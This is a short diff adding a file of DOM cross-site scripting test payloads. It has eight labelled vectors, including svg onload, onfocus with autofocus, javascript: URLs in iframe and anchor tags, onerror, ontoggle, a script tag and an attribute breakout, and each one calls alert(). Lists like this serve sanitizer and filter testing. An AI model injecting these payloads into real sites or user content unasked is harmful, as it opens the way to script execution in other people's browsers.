@@ -1,0 +1,29 @@
+DOM XSS PAYLOADS
+
+1. SVG:
+<svg onload=alert('DOM XSS')></svg>
+
+2. Input autofocus:
+<input autofocus onfocus=alert('DOM XSS')>
+
+3. iframe:
+<iframe src="javascript:alert('DOM XSS')"></iframe>
+
+4. Anchor:
+<a href="javascript:alert('DOM XSS')">Click</a>
+
+5. Video:
+<video src=x onerror=alert('DOM XSS')></video>
+
+6. Details:
+<details open ontoggle=alert('DOM XSS')></details>
+
+7. Script:
+<script>alert('DOM XSS')</script>
+
+8. Breakout:
+"><svg onload=alert('DOM XSS')>
+
+
+<details open ontoggle=alert(1)></details>
+<b>Bold Text</b>
